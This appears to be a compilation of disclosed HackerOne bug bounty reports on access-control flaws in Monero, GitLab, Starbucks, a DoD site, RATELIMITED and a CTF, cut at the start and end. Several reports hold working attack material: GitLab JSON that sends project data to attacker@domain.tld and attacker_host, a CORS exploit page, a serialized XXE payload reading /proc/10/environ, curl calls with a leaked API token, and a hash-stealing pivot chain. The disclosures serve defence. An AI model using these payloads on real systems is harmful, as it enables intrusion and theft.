- **Reporter:** @thanhb
- **Bounty:** - usd
- **Disclosed:** 2019-04-03T22:38:50.924Z
- **CVE(s):** -

**Vulnerability Information:**

## Description:
As per our understanding, Monero wallet app provides a separate executable for the user to enable the RPC interface (monero-wallet-rpc). When the user runs the executable, the RPC server will start on a port number that is specified by the user. The RPC server authenticates the client with the HTTP digest access authentication scheme, which is based on a simple challenge-response paradigm. Basically, the client receives a nonce from the server and then replies with a MD5 hash value of the username, the password, the nonce, the HTTP method, and the URI. 

An attacker is a non-privileged user, who can sign in to the victim’s computer with his own credentials or guest account. The attacker first needs to run a process in the background when the victim is using the computer. On Linux and macOS, the attacker only needs to log in, run the process, and leave it running when he logs out. On Windows, user processes are killed at the end of the login session, and thus the attacker needs to do fast user switching to leave his session in the background. The attacker can also remotely run his malicious process if SSH or remote desktop is enabled on the target computer.

With the malicious process running in the background, it is possible to perform server impersonation on the Monero wallet by hijacking the port number before the victim starts the RPC server. The digest access authentication mechanism does not help here because it only authenticates the client. However, the RPC executable will fail to start if the port that it uses has already been taken. While this allows the victim to detect the attack, it does not free him from risks. For example, an aggressively-caching user may attach the RPC executable to the operating system's startup to launch it automatically after login for convenience. In that case, since the RPC server process does not have a GUI to notify the victim that it has failed, the victim will not notice the failure and thus assume that the RPC server is running. Hence, the attacker's malicious server captures commands from the benign client. An example of such commands is “create_wallet”, which tells the server to create a new wallet account. This allows the attacker to have access to the new account because it is created by the attacker instead of the real wallet application.

The attack is straightforward, and no privilege escalation is needed. Also, there are many potential attackers who can perform the attack. For example, in enterprise environments that employ centralized access control mechanisms and allow login by multiple users to the same computer, anyone is a potential attacker. Any computer with guest account enabled is similarly vulnerable.

## Releases Affected:
Tested on Monero wallet 0.12.3

## How to fix:
We found similar issues on other cryptocurrencies’ wallet applications and are working with them to address the issues. There are various ways to prevent the attack, some of which are as follows:
- Mandate the use of TLS on the RPC interface.
- The RPC server accepts only RPC clients that are owned by users belonging to Administrators or a special group.

## Supporting Material/References:
Recently, we have shown similar critical vulnerabilities in many well-known password managers, hardware tokens, and other security-critical applications at Usenix Security and DefCon: 
https://www.usenix.org/conference/usenixsecurity18/presentation/bui

## Impact

Access to the victim's wallet without knowing authentication credentials.

---

### [Bug in GraphQL and API integration leads to limited user address disclosure](https://hackerone.com/reports/473742)

- **Report ID:** `473742`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @loxiran
- **Bounty:** - usd
- **Disclosed:** 2019-03-08T14:03:53.347Z
- **CVE(s):** -

**Summary (team):**

A modified GraphQL query to fetch a user's address book entries led to a limited disclosure of user address book entries. The modified query resulted in a backend API request with undefined as a parameter. The response contained address lists of accounts with a username of undefined. We were not able to identify any horizontal privilege escalation vulnerabilities as a result of this report, however, the issue was triaged and resolved as a High severity finding.

Many thanks to @loxiran for reporting this issue.

---

### [Exfiltrate and mutate repository and project data through injected templated service](https://hackerone.com/reports/446585)

- **Report ID:** `446585`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 11000 usd
- **Disclosed:** 2019-03-05T00:09:55.389Z
- **CVE(s):** -

**Vulnerability Information:**

The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template. Service templates can normally only be created by a GitLab instance Administrator. When a new project is created, service templates are automatically initialized for the project that is being created. Initializing and saving the service templates is handled in the `Projects::CreateService` class:

**app/services/projects/create_service.rb**
```ruby
# ...
def create_services_from_active_templates(project)
  Service.where(template: true, active: true).each do |template|
    service = Service.build_from_template(project.id, template)
    service.save!
  end
end
# ...
```

This means that when an attacker has created a templated service that is valid, any project created after that, will automatically install the attacker's service for that project. There are multiple attacks possible with this, which will be described in the Impact section of this report. Depending on the strategy the attacker takes, it may impact Confidentiality, Integrity, as well as Availability.

# Proof of concept
Attached you can find a tar file that injects a `MockCiService` as template to the GitLab instance: F377180. In order to manually reproduce this, follow the steps below.

1. Sign in as any user
1. Create a new project
1. Enable the CI service through Settings > Integrations
1. Export the project and download the export file
1. Extract the files, it'll contain a `project.json` file
1. Replace `"template":false` in the `services` array with `"template":true`
1. Replace `CiService` in the `services` array with `MockCiService`
1. Create a new tar file (`tar -zcvf service_template.tar.gz project.json VERSION project.bundle`)
1. Upload the tar file
1. Sign in as another user
1. Create another project
1. Immediately export the project and download the export file
1. Extract the files
1. Observe that the `project.json` file will contain the service created for the other project

# Additional, seemingly, less severe issues
When looking into this feature, it was also observed that an attacker can create custom attributes for a project. I noticed that custom project attributes can only be created by an instance Administrator. However, by specifying custom attributes in the `custom_attributes` array, a user can create custom project attributes for the project that is being created. Depending on how the custom attributes are used on the instance, this may have additional consequences.

## Impact

An attacker can decide on what strategy to take with this vulnerability. The most interesting ones that I could find are described below.

**Exfiltrating repository event**
The `EmailsOnPushService` has the option to include a commit diff in an email. When the JSON below is added to the `project.json` file, any commit's diff will be emailed to the attacker.

```json
{
  "id": 41858507,
  "title": "Email",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "send_from_committer_email": false,
    "disable_diffs": false,
    "recipients": "attacker@domain.tld"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "ci",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "EmailsOnPushService"
}
```

**Exfiltrating (confidential) issues, merge requests, pipelines, etc.**
The HipChat service, similar to Slack, is a service that responds to all events a project can trigger. Creating a template for this service will automatically send all new issues, notes, merge requests, pipeline updates, and pushes to a HipChat server. Below is the JSON object to inject a HipChat service template.

```json
{
  "id": 41858507,
  "title": "HipChat",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "token": "some_token",
    "room": "room",
    "server": "",
    "color": "red",
    "api_version": ""
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "common",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "HipchatService"
}
```

**Hidden services**
An attacker can leverage the `MockCiService` to inject a service that is not visible in the UI. The only mock service that interacts with an actual service is the `MockCiService`. The other two, `MockDeploymentService` and `MockMonitoringService`, do not interact with an external URL.

```json
{
  "id": 41858507,
  "title": "MockCI",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "mock_service_url": "https://attacker_host/",
    "multiproject_enabled": "1",
    "pass_unstable": "0"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "ci",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "MockCiService"
}
```

Unconfirmed: **Mutating data**
The Slack service / integration allows a user to also interact with objects in a project. Because an attacker can force a weak token in the service template, it can then send an API request to the GitLab API to interact with the project. This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com and I was not able to set up the Slack integration on my own GitLab instance. However, I was able to confirm that I was able to create this service on my own GitLab instance with a weak token (`a`). JSON below.

```json
{
  "id": 41858507,
  "title": "Slack",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "token": "a"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "common",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "SlackSlashCommandsService"
}
```

**External services**
The two other services that had an interesting side effect were the `ExternalWikiService` and `CustomIssueTrackerService`. Both of them can be used to overwrite a project's Issue and Wiki URL in their project. This may be used to social engineer users into creating issues on a domain that is controlled by the attacker.

---

### [[██████] Cross-origin resource sharing misconfiguration (CORS)](https://hackerone.com/reports/470298)

- **Report ID:** `470298`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jarvis0x1
- **Bounty:** - usd
- **Disclosed:** 2019-01-28T13:31:46.124Z
- **CVE(s):** -

**Vulnerability Information:**

Hi!

In this report I want to describe High level bug which can seriously compromise a user account.

If I am authorize on this site, I can steal user's sessions, some personal information or do some action.

### Steps for reproduce

1) Send this request

```
GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1
Host: www.█████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: exploit.com
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

In response headers you can see headers
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: exploit.com
```

{F395049}


So you can write exploit:
```
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
	        var xhttp = new XMLHttpRequest();
		        xhttp.onreadystatechange = function() {
			        if (this.readyState == 4 && this.status == 200) {
			        	document.getElementById("emo").innerHTML = alert(this.responseText);
	        }
         };
         xhttp.open("GET", "https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

Result:
{F395063}
### How to fix

Rather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.

---

### [unuse domain still in using at wechat by Starbucks East China](https://hackerone.com/reports/471265)

- **Report ID:** `471265`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @k3mlol
- **Bounty:** - usd
- **Disclosed:** 2019-01-22T23:17:14.214Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
spcc.mobi is still using at wechat offical account by Starbucks East China. but this domain is **on sale**.

**Description:**
I had reported this at report_id=433843，bu your gays had ignored, because they said the domain is unused.

In fact, spcc.mobi still having an interface using at wechat offical account by Starbucks East China

wechat offical account name is **星巴克江浙沪**

endponit request below:

``` html
GET /v5/bind.html HTTP/1.1
Host: coupon.ec-starbucks.cn
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044405 Mobile Safari/537.36 MMWEBID/157 MicroMessenger/6.7.3.1360(0x260703EC) NetType/WIFI Language/zh_CN Process/tools
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,en-US;q=0.8
Cookie: PHPSESSID=ip1f71qqak3kvakksu28bensjlapsh9a; Hm_lvt_b7c2e12efc764f8179148ddbece8211f=1545489448; Hm_lpvt_b7c2e12efc764f8179148ddbece8211f=1545489448
Connection: close

```
reponse is below:

``` html
....
<script>
	$(function(){
		$.get('http://weixin.spcc.mobi/oauth/_jssdk.html',{url:location.href.split('#')[0]},function(data){
			 wx.config($.extend({
			    debug: false,
			    jsApiList: ['onMenuShareTimeline','onMenuShareAppMessage','onMenuShareQQ','onMenuShareWeibo','hideMenuItems','showMenuItems','hideOptionMenu','showOptionMenu',]
			},data));
		},'jsonp');
	})
	
	wx.ready(function () {	
		wx.hideOptionMenu();
	});

</script>
....
```

**Platform(s) Affected:**
- coupon.ec-starbucks.cn(Starbucks East China in using)

## Steps To Reproduce:

#### plan A(easy)
1. request the endpoint I offer
2. you will find the reponse contain "weixin.spcc.mobi"
3. visit the **weixin.spcc.mobi** you will find that this domain is on sale

#### plan B(complicated)
1. register a wechat account(download the app(name is wechat) from app store or play store)
2. search wechat offical account **星巴克江浙沪** then follow
3. click my card
4. you can find the requests as the I had mention.

## Recommendations for fix
remove the the unused **weixin.spcc.mobi** endpoint

## Impact

the domain is on sale, if attacker buy  this domain, can full control this domain for(Phishing Attack and etc.)

---

### [Local File Download](https://hackerone.com/reports/345162)

- **Report ID:** `345162`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** RATELIMITED
- **Reporter:** @z0mb13
- **Bounty:** - usd
- **Disclosed:** 2019-01-01T15:09:04.608Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** This bug affects suuport.ratelimited.me and can be used by attackers to download local file from your servers including your emails, and files uploaded by your admins and other users.

**Description:** While starting a conversation with your support agent, I noticed an option to upload a file. And after it was being uploaded it was included with a "blob_id" parameter. it is vulnerable and is leading to download of all the files on your support server.

## Steps To Reproduce:

  * Follow the above steps as mentioned in description to get to the request mentioned below.]

```
GET /chat/send-attach/583-5PH467W8RA2NCWJ?__sid=583-5PH467W8RA2NCWJ&send_blob_id=485&_=1525115609706 HTTP/1.1
Host: support.ratelimited.me
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://support.ratelimited.me/widget/chat.html?dpsid=583-5PH467W8RA2NCWJ&parent_url=https%3A%2F%2Fsupport.ratelimited.me%2Fprofile
X-Requested-With: XMLHttpRequest
Cookie: __cfduid=debed713d869308c24159d6b0ce4df2481525076018; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-DH6W43CBT3WHJQN; __unam=c0d18f2-16315a5f2ac-ba1665a-242; __utma=138098738.1674211735.1525076589.1525107067.1525114365.3; __utmc=138098738; __utmz=138098738.1525076589.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dpvut=X635APM2; dpchat_sid=583-5PH467W8RA2NCWJ; __utmb=138098738.29.10.1525114365; __utmt=1; dpchatid=51
Connection: close
```

  * After this I used a simple Intruder in the Burp suite to automate my requests to find out which blob_id numbers are giving a 200 Response. Attached a screenshot of the same.

  * I was able to read your personal emails and all the server logs, also all the files uploaded by others and admins. I was also able to join a ticket due to an email which leaked the joining link.
The irony is I was also able to read the email sent by Hackerone support to start this program :D

No harm has been done, you can remove the screenshots from here after you fix this bug.

## Supporting Material/References:

  * Have attached all the screenshots below which shows how harmful this could have been.

## Impact

All the files on the server are being leaked incuding personal emails and logs.

---

### [Publicly editable GitHub wikis](https://hackerone.com/reports/460121)

- **Report ID:** `460121`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Liberapay
- **Reporter:** @strukt
- **Bounty:** - usd
- **Disclosed:** 2018-12-12T18:37:04.801Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,

While browsing `https://github.com/liberapay` I found that many of the repositories have their wikis publicly editable by any GitHub user. The following are some of the affected repositories:
```
https://github.com/liberapay/cardregistration-js-kit/wiki
https://github.com/liberapay/mangopay2-python-sdk/wiki
```

I went on and created the following wiki page as a PoC:
`https://github.com/liberapay/cardregistration-js-kit/wiki/PoC`

## Impact

This enables an attacker to edit the wiki pages of the affected repositories completely remotely, adding content that may link to malicious code libraries that would be installed and used by developers or information that may mislead your users.

---

### [HTTP PUT method enabled](https://hackerone.com/reports/460642)

- **Report ID:** `460642`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** RATELIMITED
- **Reporter:** @hach3ro
- **Bounty:** - usd
- **Disclosed:** 2018-12-11T19:20:27.350Z
- **CVE(s):** -

**Vulnerability Information:**

Hi security team,

Summary: It is possible to upload files to the server using the PUT method

Steps To Reproduce:
I used the following request:
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10
Connection: close

Now a file exists at https://ratelimited.me/emitrani.txt
with contents of the put request.

## Impact

impact

---

### [HTTP PUT method enabled](https://hackerone.com/reports/369581)

- **Report ID:** `369581`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** RATELIMITED
- **Reporter:** @emitrani
- **Bounty:** - usd
- **Disclosed:** 2018-12-11T15:55:47.812Z
- **CVE(s):** -

**Vulnerability Information:**

Hi security team,

**Summary:** It is possible to upload files to the server using the PUT method

## Steps To Reproduce:

1. I used the following request:

```
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10
Connection: close

emitrani POC
```
Now a file exists at https://ratelimited.me/emitrani.txt
with contents of the put request.

## Impact

Anyone can upload files to the server.

Regards,
Eray

---

### [Getting all the CD keys of any game](https://hackerone.com/reports/391217)

- **Report ID:** `391217`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @moskowsky
- **Bounty:** 20000 usd
- **Disclosed:** 2018-10-31T18:11:03.282Z
- **CVE(s):** -

**Summary (team):**

Using the `/partnercdkeys/assignkeys/` endpoint on partner.steamgames.com with specific parameters, an authenticated user could download previously-generated CD keys for a game which they would not normally have access. Audit logs were not bypassed using this method, and an investigation of those audit logs did not show any prior or ongoing exploitation of this bug.

**Summary (researcher):**

https://www.youtube.com/watch?v=t0MWDqiKVPk

---

### [MemeCTF serial exploitation to local file read to Papertrail access via API-token leakage and more](https://hackerone.com/reports/416123)

- **Report ID:** `416123`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-5411-CTF
- **Reporter:** @osintopsec
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T20:38:44.720Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there dear CTF staff!

First of all a huge thank you for the great challenge you put up! I've found it super exciting and the learning curve has been steep.

For this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn't seem so! I did even reach out to you via Twitter for initial confirmation.

{F352815}


The Case
=====================

During some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:
-> /etc/apache2/apache2.conf
-> /etc/apache2/envvars
-> /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = "" and the file contains "10")
-> /proc/10/environ

Which contains the environment data for Apache2 as (redacted for your good!):

```
HEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED
PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
SHLVL=1
PHP_EXTRA_BUILD_DEPS=apache2-dev
PORT=58345
PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2
PHP_MD5=
PHP_VERSION=7.2.10
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED
PHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2
_=/usr/sbin/apache2ctl
PHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
PWD=/app
PHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0
APACHE_ENVVARS=/etc/apache2/envvars
DYNO=web.1
```

What caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.

{F352822}

So, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!

After some poking around I landed on this:

```
curl -i -H "X-Papertrail-Token: ii6r9Ze-REDACTED" https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED
HTTP/1.1 200 OK
Date: Sat, 29 Sep 2018 11:29:58 GMT
Strict-Transport-Security: max-age=31536000
X-Frame-Options: SAMEORIGIN
X-Rate-Limit-Limit: 25
X-Rate-Limit-Remaining: 24
X-Rate-Limit-Reset: 2
X-Shibboleet: if you see this, we'd like to get you a thank you espresso
X-Runtime: 440
ETag: "6fa205988ad388afc-REDACTED"
Cache-Control: private, max-age=0, must-revalidate
Content-Length: 636600
Status: 200 OK
Content-Type: application/json; charset=utf-8

{
	"min_id": "98264920-REDACTED",
	"max_id": "9826557-REDACTED",
	"events": [{
			"id": "9826492-REDACTED",
			"source_ip": "54.205.-REDACTED",
			"program": "heroku/router",
			"message": "at=info method=GET path=\"/vendor/font-awesome/css/font-awesome.min.css\" host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\"192.130.-REDACTED\" dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https ",
			"received_at": "2018-09-29T04:04:09-07:00",
			"generated_at": "2018-09-29T04:04:09-07:00",
			"display_received_at": "Sep 29 04:04:09",
			"source_id": 23562-REDACTED,
			"source_name": "h1-5411-2018-ctf",
			"hostname": "h1-5411-2018-ctf",
			"severity": "Info",
			"facility": "Local3"
		}, {
			"id": "982649204-REDACTED",
			"source_ip": "50.19.-REDACTED",
			"program": "heroku/router",
			"message": "at=info method=GET path=\"/vendor/jquery-easing/jquery.easing.min.js\" host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\"192.130.-REDACTED\" dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https ",
			"received_at": "2018-09-29T04:04:09-07:00",
			"generated_at": "2018-09-29T04:04:09-07:00",
			"display_received_at": "Sep 29 04:04:09",
			"source_id": 23562-REDACTED,
			"source_name": "h1-5411-2018-ctf",
			"hostname": "h1-5411-2018-ctf",
			"severity": "Info",
			"facility": "Local3"
		},
........ And so on.
```

And this particular header caught my eye:

```
X-Shibboleet: if you see this, we'd like to get you a thank you espresso
```

So here I am, writing a report about this.

Steps to reproduce
=====================
A good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I'll also skip the first parts of the challenge, since they're not neede to reproduce.

1. Prepare the following serialized PHP-object  with a XXE payloadfor injection
```
a:2:{i:0;s:93:"../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt";i:1;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'>]><meme><toptext>qwerty</toptext><bottomtext>asdasd</bottomtext><template>&xxe;</template><type>TEXT</type></meme>";}}
```

which is the following base64-string

```
YToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=
```
and save it as "memes.memepack" -file

2. Navigate to https://h1-5411.h1ctf.com/import_memes_2.0.php
3. Click "Choose file" and open the newly created "memes.memepack"-file
4. Open browser developer console or log requests with a proxy
5. Click "Import"
6. Inspect developer console or proxy, which should look similar to
{F352830}
7. Base64-decode parameter "Template Location" after "=>", which contains the file /proc/10/environ -file
8. Profit! 
9. Get the Papertrail API-token
10. Prepare Curl for example as following
 ```
curl -i -H "X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]"  https://papertrailapp.com/api/v1/events/search.json?q=error
```

11. Inspect that response headers look similar to this:
```
curl -i -H "X-Papertrail-Token: ii6r9Ze-REDACTED" https://papertrailapp.com/api/v1/events/search.json?q=error
HTTP/1.1 200 OK
Date: Sat, 29 Sep 2018 13:08:00 GMT
Strict-Transport-Security: max-age=31536000
X-Frame-Options: SAMEORIGIN
X-Rate-Limit-Limit: 25
X-Rate-Limit-Remaining: 24
X-Rate-Limit-Reset: 5
X-Shibboleet: if you see this, we'd like to get you a thank you espresso
X-Runtime: 528
ETag: "7207607ce216ca0fc-REDACTEDc"
Cache-Control: private, max-age=0, must-revalidate
Content-Length: 498309
Status: 200 OK
Content-Type: application/json; charset=utf-8
```
12. Double profit!

## Impact

The main impact of this vulnerability seems to be this!
```
X-Shibboleet: if you see this, we'd like to get you a thank you espresso
```

However, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.

{F352838}

---

### [svcardproxydevus.starbucks.com Subdomain take over](https://hackerone.com/reports/380158)

- **Report ID:** `380158`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @txt3rob
- **Bounty:** - usd
- **Disclosed:** 2018-07-23T17:47:15.343Z
- **CVE(s):** -

**Vulnerability Information:**

You have left a dns record pointing to a dead cloudapp vm.

```
svcardproxydevus.starbucks.com -> s00307ntmp0svcardproxydev0.trafficmanager.net -> s00307dpipsvcardproxy00.eastus.cloudapp.azure.com = Dead
```

## Impact

```
1) Attacker takes over subdomain and then puts something like porn or something that shouldn't be on the domain.
2) hacker then contacts support pretending to be a concerned user.
3) support click on it to check what is going on
4) attacker has put responder on the page via a image file using a UNC path (https://github.com/SpiderLabs/Responder)
5) attacker is then sent supports hash for their windows login.
6) attacker then cracks hash and uses the VPN to pivot 
```

They can also use it to phish and other bad activitys

**Summary (researcher):**

I was monitoring starbucks.com with https://takeover.cyberint.com/ and noticed it flagged up 2 subdomains with issues.

After using subfinder and tko-subs i was able to determine the subdomains which were dead and take over.

---

### [GitHub import allows user to create child group under existing namespace](https://hackerone.com/reports/301137)

- **Report ID:** `301137`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 750 usd
- **Disclosed:** 2018-05-24T18:27:39.151Z
- **CVE(s):** CVE-2017-0919

**Vulnerability Information:**

When importing a GitHub repository on GitLab, a request is made to `/import/github`. The user is allowed to pass along a target namespace where they want to add the repository. In this process, the code will create the namespace if it doesn't exist already. However, this can be used to create a sub-group of an existing group and give you "owner" level access to the sub-group. This has a couple benefits, including being able to use the plan of the owner group, see who is part of the group (helpful in case the group is private), and, perhaps most importantly, being able to create new projects under a group you're unauthorized to.

To reproduce, make sure there's a GitLab instance that has a group a user is unauthorized to create projects / groups for. Then, sign in to the normal user account and authorize GitLab to view your GitHub projects. Intercept your network traffic, then click the "Import" button. Observe a request similar to the one below being submitted:

**Request**
```
POST /import/github HTTP/1.1
Host: gitlab-instance
...

repo_id=115670444&target_namespace=jobertabma&new_name=test
```

In this request, change the `target_namespace` to `secret-group/test`. This will create a sub-group called `test` to the group `secret-group`.████ To exploit this, an attacker could set a GitLab logo as their group avatar and start spreading gitlab-ce and gitlab-ee projects under the gitlab-org namespace.

**The sub-group as shown on the gitlab-org group page**
{F250077}

**Automatic billing due to the relationship with gitlab-org**
{F250076}

This has been tested against the latest version of GitLab.

## Impact

N/A

---

### [Gaining access to private topics using quoting feature](https://hackerone.com/reports/312647)

- **Report ID:** `312647`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Discourse
- **Reporter:** @mishre
- **Bounty:** 256 usd
- **Disclosed:** 2018-03-17T18:27:00.122Z
- **CVE(s):** -

**Vulnerability Information:**

## Description
Some topics have limited access to certain groups and users, and while there exists a validation for access on this topic, it can be bypassed by abusing a vulnerability in the "onebox" quoting feature. 
